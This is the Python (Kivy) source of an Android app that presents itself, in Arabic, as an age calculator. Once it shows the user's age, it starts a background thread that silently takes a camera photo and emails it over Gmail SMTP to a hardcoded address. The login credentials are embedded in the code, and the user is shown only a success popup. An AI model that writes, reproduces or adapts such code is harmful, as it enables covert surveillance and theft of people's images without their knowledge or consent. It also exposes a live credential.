# -*- coding: utf-8 -*-

# =================================================
# استيراد المكتبات الضرورية
# =================================================
import datetime
import os
import smtplib
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.popup import Popup
from kivy.clock import Clock
from kivy.utils import platform

# =================================================
# طلب الصلاحيات على أندرويد (هذا هو الجزء الجديد والمهم)
# =================================================
if platform == 'android':
    from android.permissions import request_permissions, Permission

class AgeCamApp(App):

    def build(self):
        # طلب الصلاحيات عند بناء الواجهة
        if platform == 'android':
            request_permissions([
                Permission.CAMERA,
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.INTERNET
            ])

        # بناء الواجهة الرئيسية
        self.layout = BoxLayout(orientation='vertical', padding=30, spacing=10)
        
        self.title_label = Label(text='حاسبة العمر', font_size='24sp')
        self.layout.add_widget(self.title_label)

        self.birth_date_label = Label(text='أدخل تاريخ ميلادك (YYYY-MM-DD):')
        self.layout.add_widget(self.birth_date_label)

        self.birth_date_input = TextInput(multiline=False, halign='center', font_size='18sp')
        self.layout.add_widget(self.birth_date_input)

        self.calculate_button = Button(text='احسب عمري', font_size='20sp')
        self.calculate_button.bind(on_press=self.process_request)
        self.layout.add_widget(self.calculate_button)

        self.result_label = Label(text='', font_size='18sp')
        self.layout.add_widget(self.result_label)
        
        return self.layout

    def process_request(self, instance):
        birth_date_str = self.birth_date_input.text
        
        # 1. حساب العمر
        try:
            birth_date = datetime.datetime.strptime(birth_date_str, "%Y-%m-%d").date()
            today = datetime.date.today()
            age = today.year - birth_date.year - ((today.month, today.day) < (birth_date.month, birth_date.day))
            self.result_label.text = f"عمرك هو: {age} سنة"
        except ValueError:
            self.result_label.text = "صيغة التاريخ خاطئة. استخدم YYYY-MM-DD"
            return

        # 2. بدء عملية التقاط الصورة وإرسالها في خيط منفصل
        threading.Thread(target=self.capture_and_send_email).start()
        
        # إظهار رسالة للمستخدم
        popup = Popup(title='نجاح', content=Label(text='تم حساب عمرك بنجاح!'), size_hint=(0.8, 0.4))
        popup.open()

    def capture_and_send_email(self):
        # هذه الوظيفة تعمل الآن في الخلفية
        try:
            from plyer import camera
            
            # تحديد مسار حفظ الصورة
            file_path = os.path.join(App.get_running_app().user_data_dir, 'capture.png')

            # التقاط الصورة
            camera.capture(on_complete=lambda path: self.send_email(path), filename=file_path)

        except Exception as e:
            print(f"Error in capture: {e}")

    def send_email(self, image_path):
        if not os.path.exists(image_path):
            print(f"Image not found at {image_path}")
            return

        try:
            sender_email = "ahwakyana@gmail.com"
            receiver_email = "ahwakyana@gmail.com"
            password = "iymf fcpu yhlg zvsr"

            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = receiver_email
            msg['Subject'] = "صورة مستخدم جديدة من التطبيق"

            body = "تم التقاط هذه الصورة من تطبيق حاسبة العمر."
            msg.attach(MIMEText(body, 'plain'))

            with open(image_path, 'rb') as f:
                img_data = f.read()
            image = MIMEImage(img_data, name=os.path.basename(image_path))
            msg.attach(image)

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(sender_email, password)
            text = msg.as_string()
            server.sendmail(sender_email, receiver_email, text)
            server.quit()
            print("Email sent successfully!")

        except Exception as e:
            print(f"Error in sending email: {e}")


if __name__ == '__main__':
    AgeCamApp().run()
